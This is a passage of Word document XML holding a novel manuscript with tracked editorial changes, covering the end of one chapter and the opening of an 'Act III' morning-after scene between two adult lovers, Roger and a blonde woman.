            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>N</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2342" w:author="TextVet" w:date="2016-03-23T14:54:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00851C2C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>There was n</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">o boundary </w:t>
      </w:r>
      <w:ins w:id="2343" w:author="TextVet" w:date="2016-03-23T14:54:00Z">
        <w:r w:rsidR="00851C2C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>separated</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2344" w:author="TextVet" w:date="2016-03-23T14:54:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00851C2C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>between</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the joys of their mutual intellectual achievement and their mutual physical pleasure</w:t>
      </w:r>
      <w:ins w:id="2345" w:author="TextVet" w:date="2016-03-23T14:56:00Z">
        <w:r w:rsidR="00AB41D4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2346" w:author="TextVet" w:date="2016-03-23T14:54:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00851C2C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="2347" w:author="TextVet" w:date="2016-03-23T14:54:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00851C2C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>There was no s</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2348" w:author="TextVet" w:date="2016-03-23T14:55:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00851C2C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>eparation</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2349" w:author="TextVet" w:date="2016-03-23T14:56:00Z">
        <w:r w:rsidR="00AB41D4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>N</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2350" w:author="TextVet" w:date="2016-03-23T14:55:00Z">
        <w:r w:rsidR="00851C2C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>o wall</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2351" w:author="TextVet" w:date="2016-03-23T14:57:00Z">
        <w:r w:rsidR="00DD22A0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>s</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="2352" w:author="TextVet" w:date="2016-03-23T14:56:00Z">
        <w:r w:rsidR="00AB41D4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">stood </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">between </w:t>
      </w:r>
      <w:ins w:id="2353" w:author="TextVet" w:date="2016-03-23T14:55:00Z">
        <w:r w:rsidR="00851C2C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">the </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ecstas</w:t>
      </w:r>
      <w:ins w:id="2354" w:author="TextVet" w:date="2016-03-23T14:55:00Z">
        <w:r w:rsidR="00851C2C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ies</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2355" w:author="TextVet" w:date="2016-03-23T14:55:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00851C2C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>y</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the mind, </w:t>
      </w:r>
      <w:del w:id="2356" w:author="TextVet" w:date="2016-03-23T14:55:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00851C2C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">ecstasy of the </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>body, and</w:t>
      </w:r>
      <w:del w:id="2357" w:author="TextVet" w:date="2016-03-23T14:55:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00851C2C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> ecstasy of the</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> soul. Their worlds — his of electronics and hers of biology, his of the mechanical and hers of the organic, his of the wizardly material and hers of the mystic divine — their passions, like their bodies, were made to be united.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00B45500">
      <w:pPr>
        <w:pStyle w:val="ActBreak"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>Act III</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>22</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morning sun shone</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> through Venetian blinds, casting long parallel lines of orange upon a disheveled bed. The stripes of daylight highlighted the contours of the blanket, tracing out the lithe, slim bodies of sleeping lovers </w:t>
      </w:r>
      <w:ins w:id="2358" w:author="TextVet" w:date="2016-03-23T14:59:00Z">
        <w:r w:rsidR="00770059">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>who</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2359" w:author="TextVet" w:date="2016-03-23T14:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00770059">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>that</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> lay beneath. A pillow supported the slender arm of a young woman, her French-manicured hand dangling over the edge, the crook of her elbow nestling a head that sported tussled locks of blond hair.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red brick walls, the morning light drew ribbons through a </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>TRON: Legacy</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> poster, a stolen “No U Turn” sign, and a shelf filled with a menagerie of vinyl KidRobot figurines.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the floor somewhere near the bed, beneath a tangled mess of laptops, headphones, and laundry, came an insistent buzzing.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blankets shuffled. From their depths arose a long, sinewy male arm, sporting Celtic sleeve tattoos. It groped the floor until it found the source of the noise, a ringing cellphone. It whisked the phone up and held it before the sleep-matted face of a young man with black, spiky hair.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screen showed, “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Dr. P</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rolled his eyes. “Go away,” he mumbled, and pressed “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Ignore</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”. He casually dropped the phone back to the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By his side, the blonde stirred. Her petite form shifted, her face lifting out of the crook of her elbow. She was turned away from him, her shoulders bearing hickeys and bite-marks. Roger</w:t>
      </w:r>
      <w:r w:rsidR="00C870FE">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>’s gaze</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> followed the curve of her supple spine</w:t>
      </w:r>
      <w:r w:rsidR="00C870FE">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="2360" w:author="TextVet" w:date="2016-03-23T15:03:00Z">
        <w:r w:rsidR="007D68FF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>M</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2361" w:author="TextVet" w:date="2016-03-23T15:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007D68FF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>m</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">oving the blanket away from the dip of her waist where it </w:t>
      </w:r>
      <w:ins w:id="2362" w:author="TextVet" w:date="2016-03-23T15:05:00Z">
        <w:r w:rsidR="00C657E2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">had </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>occluded his view</w:t>
      </w:r>
      <w:ins w:id="2363" w:author="TextVet" w:date="2016-03-23T15:03:00Z">
        <w:r w:rsidR="007D68FF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, he smiled.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2364" w:author="TextVet" w:date="2016-03-23T15:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007D68FF">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Below her flowery tramp-stamp, her perfect young ass sported a distinct rosy hand-shaped welt. Grinning</w:t>
      </w:r>
      <w:del w:id="2365" w:author="TextVet" w:date="2016-03-23T15:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B44BF8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> smugly</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, Roger </w:t>
      </w:r>
      <w:ins w:id="2366" w:author="TextVet" w:date="2016-03-23T15:06:00Z">
        <w:r w:rsidR="00B44BF8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>touristical</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2367" w:author="TextVet" w:date="2016-03-23T15:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B44BF8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>slow</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ly traced his finger</w:t>
      </w:r>
      <w:ins w:id="2368" w:author="TextVet" w:date="2016-03-23T15:06:00Z">
        <w:r w:rsidR="00A540D9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>tip</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s across her toned midsection and up toward her chest to fondle a pert, firm breast.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Her face turned lazily toward him</w:t>
      </w:r>
      <w:ins w:id="2369" w:author="TextVet" w:date="2016-03-23T15:07:00Z">
        <w:r w:rsidR="00BC0194">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del w:id="2370" w:author="TextVet" w:date="2016-03-23T15:07:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BC0194">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">with </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:del w:id="2371" w:author="TextVet" w:date="2016-03-23T15:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C81367">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> wide,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> sleepy smile </w:t>
      </w:r>
      <w:ins w:id="2372" w:author="TextVet" w:date="2016-03-23T15:08:00Z">
        <w:r w:rsidR="00C81367">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>widen</w:t>
        </w:r>
        <w:r w:rsidR="00BC0194">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">ing </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:del w:id="2373" w:author="TextVet" w:date="2016-03-23T15:07:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BC0194">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">her </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bright pink lips. She writhed softly for a moment to uncurl herself</w:t>
      </w:r>
      <w:del w:id="2374" w:author="TextVet" w:date="2016-03-23T15:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DA0ADF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> from her sleeping position</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2375" w:author="TextVet" w:date="2016-03-23T15:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DA0ADF">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376" w:author="TextVet" w:date="2016-03-23T15:11:00Z">
        <w:r w:rsidR="00DA0ADF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>before</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2377" w:author="TextVet" w:date="2016-03-23T15:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DA0ADF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="2378" w:author="TextVet" w:date="2016-03-23T15:10:00Z">
        <w:r w:rsidR="00DA0ADF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>arc</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2379" w:author="TextVet" w:date="2016-03-23T15:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DA0ADF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>reach</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2380" w:author="TextVet" w:date="2016-03-23T15:11:00Z">
        <w:r w:rsidR="00DA0ADF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
